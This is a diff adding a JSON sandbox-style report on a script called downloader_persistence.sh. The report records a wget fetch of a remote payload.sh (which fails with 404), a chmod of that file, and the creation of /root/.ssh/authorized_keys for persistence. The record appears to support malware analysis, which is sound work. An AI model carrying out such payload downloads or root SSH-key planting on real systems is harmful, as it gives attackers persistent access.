@@ -1,0 +1,22 @@
+{
+  "target_file": "/tmp/tmpaat4vl79/home/user/Documents/downloader_persistence.sh",
+  "execution_time": 1,
+  "exit_code": 0,
+  "network_connections": [],
+  "traffic_verdict": [],
+  "filesystem_changes": {
+    "modified": [
+      "/root"
+    ],
+    "new": [
+      "/root/.ssh",
+      "/root/.ssh/authorized_keys"
+    ],
+    "deleted": []
+  },
+  "malware_output": {
+    "content": "--2026-06-24 15:40:34--  http://example.com/payload.sh\nResolving example.com (example.com)... 172.66.147.243, 104.20.23.154\nConnecting to example.com (example.com)|172.66.147.243|:80... connected.\nHTTP request sent, awaiting response... 404 Not Found\n2026-06-24 15:40:34 ERROR 404: Not Found.\n\nchmod: cannot access 'payload.sh': No such file or directory",
+    "lines": 7,
+    "truncated": false
+  }
+}
